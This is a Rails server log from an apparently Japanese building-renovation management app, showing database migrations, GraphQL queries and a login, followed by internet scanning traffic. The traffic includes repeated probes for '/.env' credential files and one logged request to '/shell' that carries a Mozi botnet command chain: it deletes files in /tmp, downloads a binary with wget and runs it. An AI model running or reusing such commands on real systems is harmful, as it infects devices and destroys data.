# Logfile created on 2023-05-21 13:46:02 +0900 by logger.rb/v1.5.0
I, [2023-05-21T13:49:41.376114 #2780]  INFO -- : Migrating to CreateUsers (20211123113713)
I, [2023-05-21T13:49:41.391065 #2780]  INFO -- : Migrating to CreateBuildings (20211206143850)
I, [2023-05-21T13:49:41.429095 #2780]  INFO -- : Migrating to CreateProjects (20211218025156)
I, [2023-05-21T13:49:41.498325 #2780]  INFO -- : Migrating to CreateItems (20220108001454)
I, [2023-05-21T13:49:41.620990 #2780]  INFO -- : Migrating to CreatePurchaseOrders (20220108060612)
I, [2023-05-21T13:49:41.633386 #2780]  INFO -- : Migrating to CreateRoomTypes (20220129073604)
I, [2023-05-21T13:49:41.701389 #2780]  INFO -- : Migrating to CreateBuildingNumbers (20220130025058)
I, [2023-05-21T13:49:41.714242 #2780]  INFO -- : Migrating to CreateRooms (20220212164553)
I, [2023-05-21T13:49:41.761173 #2780]  INFO -- : Migrating to AddReferenceToBuilding (20220228155930)
I, [2023-05-21T13:49:41.776687 #2780]  INFO -- : Migrating to CreateProjectImages (20220301073220)
I, [2023-05-21T13:49:41.792507 #2780]  INFO -- : Migrating to AddImageReportToProject (20220305022917)
I, [2023-05-21T13:49:41.795275 #2780]  INFO -- : Migrating to CreateImageComments (20220410002857)
I, [2023-05-21T13:49:41.925335 #2780]  INFO -- : Migrating to CreateOrders (20221016075539)
I, [2023-05-21T13:49:41.943264 #2780]  INFO -- : Migrating to CreateComments (20221022000327)
I, [2023-05-21T13:49:42.010703 #2780]  INFO -- : Migrating to CreateProjectImageComments (20221027225829)
I, [2023-05-21T13:49:42.023648 #2780]  INFO -- : Migrating to CreateJkkUsers (20221030071956)
I, [2023-05-21T13:49:42.033110 #2780]  INFO -- : Migrating to CreateProjectCompanies (20230315031113)
I, [2023-05-21T13:50:05.068925 #2866]  INFO -- : Started GET "/buildings" for 133.106.76.88 at 2023-05-21 13:50:05 +0900
I, [2023-05-21T13:50:05.070648 #2866]  INFO -- : Processing by UserController#index as HTML
I, [2023-05-21T13:50:05.070717 #2866]  INFO -- :   Parameters: {"all"=>"buildings"}
I, [2023-05-21T13:50:05.074638 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.3ms | Allocations: 153)
I, [2023-05-21T13:50:05.081494 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 7.3ms | Allocations: 1046)
I, [2023-05-21T13:50:05.081881 #2866]  INFO -- : Completed 200 OK in 11ms (Views: 8.6ms | Allocations: 2348)
I, [2023-05-21T13:50:11.055318 #2866]  INFO -- : Started POST "/graphql" for 133.106.76.88 at 2023-05-21 13:50:11 +0900
I, [2023-05-21T13:50:11.056556 #2866]  INFO -- : Processing by GraphqlController#execute as */*
I, [2023-05-21T13:50:11.056628 #2866]  INFO -- :   Parameters: {"operationName"=>"currentUser", "variables"=>{}, "query"=>"query currentUser {\n  currentUser {\n    ...userFragment\n    __typename\n  }\n}\n\nfragment userFragment on User {\n  id\n  loginId\n  email\n  role\n  firstName\n  lastName\n  tel\n  active\n  isAssesment\n  __typename\n}", "graphql"=>{"operationName"=>"currentUser", "variables"=>{}, "query"=>"query currentUser {\n  currentUser {\n    ...userFragment\n    __typename\n  }\n}\n\nfragment userFragment on User {\n  id\n  loginId\n  email\n  role\n  firstName\n  lastName\n  tel\n  active\n  isAssesment\n  __typename\n}"}}
I, [2023-05-21T13:50:11.082585 #2866]  INFO -- : Completed 200 OK in 26ms (Views: 0.3ms | ActiveRecord: 7.7ms | Allocations: 9745)
I, [2023-05-21T13:50:11.684294 #2866]  INFO -- : Started POST "/graphql" for 133.106.76.88 at 2023-05-21 13:50:11 +0900
I, [2023-05-21T13:50:11.685198 #2866]  INFO -- : Processing by GraphqlController#execute as */*
I, [2023-05-21T13:50:11.685310 #2866]  INFO -- :   Parameters: {"operationName"=>"buildings", "variables"=>{"page"=>1, "search"=>{"keyword"=>nil}}, "query"=>"query buildings($page: Int, $perPage: Int, $search: BuildingSearch) {\n  buildings(page: $page, perPage: $perPage, search: $search) {\n    buildings {\n      ...buildingFragment\n      __typename\n    }\n    pagination {\n      ...paginationFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment buildingFragment on Building {\n  id\n  name\n  address\n  rank\n  rankText\n  mcTypeId\n  buildingTypeId\n  __typename\n}\n\nfragment paginationFragment on Pagination {\n  resultsCount\n  totalCount\n  totalPages\n  currentPage\n  nextPage\n  previousPage\n  hasNextPage\n  hasPreviousPage\n  __typename\n}", "graphql"=>{"operationName"=>"buildings", "variables"=>{"page"=>1, "search"=>{"keyword"=>nil}}, "query"=>"query buildings($page: Int, $perPage: Int, $search: BuildingSearch) {\n  buildings(page: $page, perPage: $perPage, search: $search) {\n    buildings {\n      ...buildingFragment\n      __typename\n    }\n    pagination {\n      ...paginationFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment buildingFragment on Building {\n  id\n  name\n  address\n  rank\n  rankText\n  mcTypeId\n  buildingTypeId\n  __typename\n}\n\nfragment paginationFragment on Pagination {\n  resultsCount\n  totalCount\n  totalPages\n  currentPage\n  nextPage\n  previousPage\n  hasNextPage\n  hasPreviousPage\n  __typename\n}"}}
I, [2023-05-21T13:50:11.696228 #2866]  INFO -- : Completed 200 OK in 11ms (Views: 0.2ms | ActiveRecord: 2.1ms | Allocations: 4087)
I, [2023-05-21T14:10:56.249075 #2866]  INFO -- : Started GET "/login" for 113.43.20.193 at 2023-05-21 14:10:56 +0900
I, [2023-05-21T14:10:56.249813 #2866]  INFO -- : Processing by UserController#index as HTML
I, [2023-05-21T14:10:56.249871 #2866]  INFO -- :   Parameters: {"all"=>"login"}
I, [2023-05-21T14:10:56.250390 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 6)
I, [2023-05-21T14:10:56.251324 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 411)
I, [2023-05-21T14:10:56.251528 #2866]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 648)
I, [2023-05-21T14:10:56.431744 #2866]  INFO -- : Started POST "/graphql" for 113.43.20.193 at 2023-05-21 14:10:56 +0900
I, [2023-05-21T14:10:56.432560 #2866]  INFO -- : Processing by GraphqlController#execute as */*
I, [2023-05-21T14:10:56.432638 #2866]  INFO -- :   Parameters: {"operationName"=>"currentUser", "variables"=>{}, "query"=>"query currentUser {\n  currentUser {\n    ...userFragment\n    __typename\n  }\n}\n\nfragment userFragment on User {\n  id\n  loginId\n  email\n  role\n  firstName\n  lastName\n  tel\n  active\n  isAssesment\n  __typename\n}", "graphql"=>{"operationName"=>"currentUser", "variables"=>{}, "query"=>"query currentUser {\n  currentUser {\n    ...userFragment\n    __typename\n  }\n}\n\nfragment userFragment on User {\n  id\n  loginId\n  email\n  role\n  firstName\n  lastName\n  tel\n  active\n  isAssesment\n  __typename\n}"}}
I, [2023-05-21T14:10:56.446465 #2866]  INFO -- : Completed 200 OK in 14ms (Views: 0.2ms | ActiveRecord: 4.5ms | Allocations: 4648)
I, [2023-05-21T14:10:58.379410 #2866]  INFO -- : Started POST "/graphql" for 113.43.20.193 at 2023-05-21 14:10:58 +0900
I, [2023-05-21T14:10:58.380179 #2866]  INFO -- : Processing by GraphqlController#execute as */*
I, [2023-05-21T14:10:58.380253 #2866]  INFO -- :   Parameters: {"operationName"=>"signin", "variables"=>{"loginId"=>"toto0", "password"=>"[FILTERED]"}, "query"=>"mutation signin($loginId: String!, $password: String!) {\n  signin(input: {loginId: $loginId, password: $password}) {\n    user {\n      ...userFragment\n      __typename\n    }\n    error\n    __typename\n  }\n}\n\nfragment userFragment on User {\n  id\n  loginId\n  email\n  role\n  firstName\n  lastName\n  tel\n  active\n  isAssesment\n  __typename\n}", "graphql"=>{"operationName"=>"signin", "variables"=>{"loginId"=>"toto0", "password"=>"[FILTERED]"}, "query"=>"mutation signin($loginId: String!, $password: String!) {\n  signin(input: {loginId: $loginId, password: $password}) {\n    user {\n      ...userFragment\n      __typename\n    }\n    error\n    __typename\n  }\n}\n\nfragment userFragment on User {\n  id\n  loginId\n  email\n  role\n  firstName\n  lastName\n  tel\n  active\n  isAssesment\n  __typename\n}"}}
I, [2023-05-21T14:10:58.677743 #2866]  INFO -- : Completed 200 OK in 297ms (Views: 0.3ms | ActiveRecord: 4.0ms | Allocations: 7799)
I, [2023-05-21T14:10:59.812727 #2866]  INFO -- : Started POST "/graphql" for 113.43.20.193 at 2023-05-21 14:10:59 +0900
I, [2023-05-21T14:10:59.813549 #2866]  INFO -- : Processing by GraphqlController#execute as */*
I, [2023-05-21T14:10:59.813705 #2866]  INFO -- :   Parameters: {"operationName"=>"projects", "variables"=>{"page"=>1, "search"=>{"keyword"=>"", "orderType"=>"desc"}}, "query"=>"query projects($page: Int, $perPage: Int, $search: ProjectSearch) {\n  projects(page: $page, perPage: $perPage, search: $search) {\n    projects {\n      ...projectFragment\n      building {\n        ...buildingFragment\n        __typename\n      }\n      buildingNumber {\n        ...buildingNumberFragment\n        __typename\n      }\n      room {\n        ...roomFragment\n        __typename\n      }\n      __typename\n    }\n    pagination {\n      ...paginationFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment projectFragment on Project {\n  id\n  yearId\n  buildingId\n  buildingNumberId\n  roomId\n  userIds\n  jkkUserId\n  assesmentUserId\n  constructionUserId\n  totalItemPrice\n  totalItemPriceRound\n  tax\n  totalPrice\n  totalPriceInput\n  name\n  jkkStatus1\n  jkkStatus2\n  jkkStatus3\n  jkkStatus4\n  orderNumberType\n  orderNumber\n  assessmentDate\n  assessmentUrl\n  orderDate1\n  orderMemo1\n  orderDate2\n  orderMemo2\n  orderDate3\n  orderMemo3\n  electricStartDate1\n  electricEndDate1\n  waterStartDate1\n  waterEndDate1\n  electricStartDate2\n  electricEndDate2\n  waterStartDate2\n  waterEndDate2\n  electricStartDate3\n  electricEndDate3\n  waterStartDate3\n  waterEndDate3\n  closeTypes\n  closeReason\n  isVermiculite\n  isFinishedVermiculite\n  vermiculiteDate\n  processCreatedDate\n  beforeConstructionImageDate\n  afterConstructionImageDate\n  checklistFirstDate\n  checklistLastDate\n  address\n  constructionStartDate\n  constructionEndDate\n  imageReportUrl\n  isFaq\n  isLackImage\n  isCompleteImage\n  submitDocumentDate\n  availableDate\n  livingYear\n  livingMonth\n  leaveDate\n  isManagerAsbestosDocument1\n  isManagerAsbestosDocument2\n  isManagerAsbestosDocument3\n  isOfficeworkAsbestosDocument1\n  isOfficeworkAsbestosDocument2\n  isOfficeworkAsbestosDocument3\n  remark\n  updatedItemsAt\n  editUserId\n  itemUploadDateText\n  reportDateText\n  checklistDateText\n  lackImageDateText\n  completeImageDateText\n  invoiceDateText\n  imageStatus\n  __typename\n}\n\nfragment buildingFragment on Building {\n  id\n  name\n  address\n  rank\n  rankText\n  mcTypeId\n  buildingTypeId\n  __typename\n}\n\nfragment buildingNumberFragment on BuildingNumber {\n  id\n  buildingId\n  name\n  position\n  __typename\n}\n\nfragment roomFragment on Room {\n  id\n  buildingNumberId\n  name\n  position\n  roomModelTypeId\n  roomLayoutId\n  __typename\n}\n\nfragment paginationFragment on Pagination {\n  resultsCount\n  totalCount\n  totalPages\n  currentPage\n  nextPage\n  previousPage\n  hasNextPage\n  hasPreviousPage\n  __typename\n}", "graphql"=>{"operationName"=>"projects", "variables"=>{"page"=>1, "search"=>{"keyword"=>"", "orderType"=>"desc"}}, "query"=>"query projects($page: Int, $perPage: Int, $search: ProjectSearch) {\n  projects(page: $page, perPage: $perPage, search: $search) {\n    projects {\n      ...projectFragment\n      building {\n        ...buildingFragment\n        __typename\n      }\n      buildingNumber {\n        ...buildingNumberFragment\n        __typename\n      }\n      room {\n        ...roomFragment\n        __typename\n      }\n      __typename\n    }\n    pagination {\n      ...paginationFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment projectFragment on Project {\n  id\n  yearId\n  buildingId\n  buildingNumberId\n  roomId\n  userIds\n  jkkUserId\n  assesmentUserId\n  constructionUserId\n  totalItemPrice\n  totalItemPriceRound\n  tax\n  totalPrice\n  totalPriceInput\n  name\n  jkkStatus1\n  jkkStatus2\n  jkkStatus3\n  jkkStatus4\n  orderNumberType\n  orderNumber\n  assessmentDate\n  assessmentUrl\n  orderDate1\n  orderMemo1\n  orderDate2\n  orderMemo2\n  orderDate3\n  orderMemo3\n  electricStartDate1\n  electricEndDate1\n  waterStartDate1\n  waterEndDate1\n  electricStartDate2\n  electricEndDate2\n  waterStartDate2\n  waterEndDate2\n  electricStartDate3\n  electricEndDate3\n  waterStartDate3\n  waterEndDate3\n  closeTypes\n  closeReason\n  isVermiculite\n  isFinishedVermiculite\n  vermiculiteDate\n  processCreatedDate\n  beforeConstructionImageDate\n  afterConstructionImageDate\n  checklistFirstDate\n  checklistLastDate\n  address\n  constructionStartDate\n  constructionEndDate\n  imageReportUrl\n  isFaq\n  isLackImage\n  isCompleteImage\n  submitDocumentDate\n  availableDate\n  livingYear\n  livingMonth\n  leaveDate\n  isManagerAsbestosDocument1\n  isManagerAsbestosDocument2\n  isManagerAsbestosDocument3\n  isOfficeworkAsbestosDocument1\n  isOfficeworkAsbestosDocument2\n  isOfficeworkAsbestosDocument3\n  remark\n  updatedItemsAt\n  editUserId\n  itemUploadDateText\n  reportDateText\n  checklistDateText\n  lackImageDateText\n  completeImageDateText\n  invoiceDateText\n  imageStatus\n  __typename\n}\n\nfragment buildingFragment on Building {\n  id\n  name\n  address\n  rank\n  rankText\n  mcTypeId\n  buildingTypeId\n  __typename\n}\n\nfragment buildingNumberFragment on BuildingNumber {\n  id\n  buildingId\n  name\n  position\n  __typename\n}\n\nfragment roomFragment on Room {\n  id\n  buildingNumberId\n  name\n  position\n  roomModelTypeId\n  roomLayoutId\n  __typename\n}\n\nfragment paginationFragment on Pagination {\n  resultsCount\n  totalCount\n  totalPages\n  currentPage\n  nextPage\n  previousPage\n  hasNextPage\n  hasPreviousPage\n  __typename\n}"}}
I, [2023-05-21T14:10:59.835633 #2866]  INFO -- : Completed 200 OK in 22ms (Views: 0.2ms | ActiveRecord: 4.0ms | Allocations: 11079)
I, [2023-05-21T14:11:01.410088 #2866]  INFO -- : Started POST "/graphql" for 113.43.20.193 at 2023-05-21 14:11:01 +0900
I, [2023-05-21T14:11:01.410887 #2866]  INFO -- : Processing by GraphqlController#execute as */*
I, [2023-05-21T14:11:01.411004 #2866]  INFO -- :   Parameters: {"operationName"=>"buildings", "variables"=>{"page"=>1, "search"=>{"keyword"=>nil}}, "query"=>"query buildings($page: Int, $perPage: Int, $search: BuildingSearch) {\n  buildings(page: $page, perPage: $perPage, search: $search) {\n    buildings {\n      ...buildingFragment\n      __typename\n    }\n    pagination {\n      ...paginationFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment buildingFragment on Building {\n  id\n  name\n  address\n  rank\n  rankText\n  mcTypeId\n  buildingTypeId\n  __typename\n}\n\nfragment paginationFragment on Pagination {\n  resultsCount\n  totalCount\n  totalPages\n  currentPage\n  nextPage\n  previousPage\n  hasNextPage\n  hasPreviousPage\n  __typename\n}", "graphql"=>{"operationName"=>"buildings", "variables"=>{"page"=>1, "search"=>{"keyword"=>nil}}, "query"=>"query buildings($page: Int, $perPage: Int, $search: BuildingSearch) {\n  buildings(page: $page, perPage: $perPage, search: $search) {\n    buildings {\n      ...buildingFragment\n      __typename\n    }\n    pagination {\n      ...paginationFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment buildingFragment on Building {\n  id\n  name\n  address\n  rank\n  rankText\n  mcTypeId\n  buildingTypeId\n  __typename\n}\n\nfragment paginationFragment on Pagination {\n  resultsCount\n  totalCount\n  totalPages\n  currentPage\n  nextPage\n  previousPage\n  hasNextPage\n  hasPreviousPage\n  __typename\n}"}}
I, [2023-05-21T14:11:01.432450 #2866]  INFO -- : Completed 200 OK in 21ms (Views: 1.0ms | ActiveRecord: 3.5ms | Allocations: 8843)
I, [2023-05-21T14:20:52.906070 #2866]  INFO -- : Started GET "/v3/time" for 104.192.0.50 at 2023-05-21 14:20:52 +0900
I, [2023-05-21T14:20:52.906786 #2866]  INFO -- : Processing by UserController#index as HTML
I, [2023-05-21T14:20:52.906837 #2866]  INFO -- :   Parameters: {"all"=>"v3/time"}
I, [2023-05-21T14:20:52.907430 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T14:20:52.908225 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 304)
I, [2023-05-21T14:20:52.908423 #2866]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 517)
I, [2023-05-21T14:27:40.929618 #2866]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.141.71 at 2023-05-21 14:27:40 +0900
I, [2023-05-21T14:27:40.930315 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T14:27:40.930365 #2866]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-05-21T14:27:40.931234 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
I, [2023-05-21T14:27:40.931961 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-05-21T14:27:40.932123 #2866]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 664)
I, [2023-05-21T15:23:38.553406 #2866]  INFO -- : Started GET "/.env" for 135.125.246.189 at 2023-05-21 15:23:38 +0900
I, [2023-05-21T15:23:38.554090 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T15:23:38.554138 #2866]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-05-21T15:23:38.554653 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T15:23:38.555443 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T15:23:38.555640 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T15:23:39.080539 #2866]  INFO -- : Started POST "/" for 135.125.246.189 at 2023-05-21 15:23:39 +0900
F, [2023-05-21T15:23:39.081025 #2866] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-05-21T15:46:49.336723 #2866]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.141.71 at 2023-05-21 15:46:49 +0900
I, [2023-05-21T15:46:49.337461 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T15:46:49.337510 #2866]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-05-21T15:46:49.338038 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 6)
I, [2023-05-21T15:46:49.338821 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 376)
I, [2023-05-21T15:46:49.338996 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 633)
I, [2023-05-21T16:01:26.181840 #2866]  INFO -- : Started GET "/.env" for 135.125.246.189 at 2023-05-21 16:01:26 +0900
I, [2023-05-21T16:01:26.182509 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T16:01:26.182557 #2866]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-05-21T16:01:26.183081 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T16:01:26.183838 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T16:01:26.184069 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T16:01:26.723345 #2866]  INFO -- : Started POST "/" for 135.125.246.189 at 2023-05-21 16:01:26 +0900
F, [2023-05-21T16:01:26.723767 #2866] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-05-21T16:09:15.008429 #2866]  INFO -- : Started GET "/%60%60%60" for 54.92.219.61 at 2023-05-21 16:09:15 +0900
I, [2023-05-21T16:09:15.009192 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T16:09:15.009241 #2866]  INFO -- :   Parameters: {"all"=>"```"}
I, [2023-05-21T16:09:15.009778 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T16:09:15.010566 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T16:09:15.010780 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T16:15:09.389942 #2866]  INFO -- : Started GET "/.env" for 185.254.196.173 at 2023-05-21 16:15:09 +0900
I, [2023-05-21T16:15:09.390592 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T16:15:09.390640 #2866]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-05-21T16:15:09.391206 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
I, [2023-05-21T16:15:09.391960 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T16:15:09.392185 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T16:15:09.919102 #2866]  INFO -- : Started POST "/" for 185.254.196.173 at 2023-05-21 16:15:09 +0900
F, [2023-05-21T16:15:09.919578 #2866] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-05-21T16:19:52.558884 #2866]  INFO -- : Started GET "/" for 185.233.19.73 at 2023-05-21 16:19:52 +0900
I, [2023-05-21T16:19:52.559563 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T16:19:52.560099 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T16:19:52.560860 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T16:19:52.561065 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T16:45:57.333973 #2866]  INFO -- : Started GET "/" for 198.235.24.120 at 2023-05-21 16:45:57 +0900
I, [2023-05-21T16:45:57.334613 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T16:45:57.335216 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T16:45:57.335944 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-05-21T16:45:57.336144 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T16:55:48.481498 #2866]  INFO -- : Started GET "/" for 23.251.102.74 at 2023-05-21 16:55:48 +0900
I, [2023-05-21T16:55:48.482174 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T16:55:48.482755 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T16:55:48.483578 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T16:55:48.483806 #2866]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 521)
I, [2023-05-21T16:57:46.242534 #2866]  INFO -- : Started GET "/shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws" for 182.222.195.228 at 2023-05-21 16:57:46 +0900
I, [2023-05-21T16:57:46.243393 #2866]  INFO -- : Processing by UserController#index as HTML
I, [2023-05-21T16:57:46.243466 #2866]  INFO -- :   Parameters: {"cd /tmp"=>nil, "rm -rf *"=>nil, "wget http://192.168.1.1:8088/Mozi.a"=>nil, "chmod 777 Mozi.a"=>nil, "/tmp/Mozi.a jaws"=>nil, "all"=>"shell"}
I, [2023-05-21T16:57:46.243956 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T16:57:46.244709 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T16:57:46.244930 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 513)
I, [2023-05-21T17:06:19.454731 #2866]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 43.154.141.71 at 2023-05-21 17:06:19 +0900
I, [2023-05-21T17:06:19.455434 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T17:06:19.455483 #2866]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-05-21T17:06:19.455979 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T17:06:19.456711 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T17:06:19.456885 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 505)
I, [2023-05-21T17:39:48.188775 #2866]  INFO -- : Started GET "/" for 139.162.84.205 at 2023-05-21 17:39:48 +0900
I, [2023-05-21T17:39:48.189454 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T17:39:48.190029 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T17:39:48.190777 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T17:39:48.191023 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T17:56:48.440226 #2866]  INFO -- : Started GET "/.env" for 135.125.246.189 at 2023-05-21 17:56:48 +0900
I, [2023-05-21T17:56:48.440896 #2866]  INFO -- : Processing by UserController#index as */*
I, [2023-05-21T17:56:48.440955 #2866]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-05-21T17:56:48.441476 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T17:56:48.442237 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T17:56:48.442439 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-05-21T17:56:48.972225 #2866]  INFO -- : Started POST "/" for 135.125.246.189 at 2023-05-21 17:56:48 +0900
F, [2023-05-21T17:56:48.972617 #2866] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-05-21T18:13:34.886454 #2866]  INFO -- : Started GET "/.env" for 5.180.209.190 at 2023-05-21 18:13:34 +0900
I, [2023-05-21T18:13:34.887161 #2866]  INFO -- : Processing by UserController#index as HTML
I, [2023-05-21T18:13:34.887211 #2866]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-05-21T18:13:34.887713 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T18:13:34.888437 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-05-21T18:13:34.888648 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 512)
I, [2023-05-21T18:13:35.386143 #2866]  INFO -- : Started GET "/" for 147.78.131.82 at 2023-05-21 18:13:35 +0900
I, [2023-05-21T18:13:35.386806 #2866]  INFO -- : Processing by UserController#index as HTML
I, [2023-05-21T18:13:35.387320 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T18:13:35.388074 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 297)
I, [2023-05-21T18:13:35.388258 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 504)
I, [2023-05-21T18:13:36.261710 #2866]  INFO -- : Started GET "/metrics" for 185.168.9.81 at 2023-05-21 18:13:36 +0900
I, [2023-05-21T18:13:36.262401 #2866]  INFO -- : Processing by UserController#index as HTML
I, [2023-05-21T18:13:36.262450 #2866]  INFO -- :   Parameters: {"all"=>"metrics"}
I, [2023-05-21T18:13:36.262912 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T18:13:36.263682 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 297)
I, [2023-05-21T18:13:36.263864 #2866]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 504)
I, [2023-05-21T18:13:36.792901 #2866]  INFO -- : Started GET "/v2/" for 147.78.131.82 at 2023-05-21 18:13:36 +0900
I, [2023-05-21T18:13:36.793554 #2866]  INFO -- : Processing by UserController#index as HTML
I, [2023-05-21T18:13:36.793603 #2866]  INFO -- :   Parameters: {"all"=>"v2"}
I, [2023-05-21T18:13:36.794100 #2866]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-05-21T18:13:36.794791 #2866]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 297)
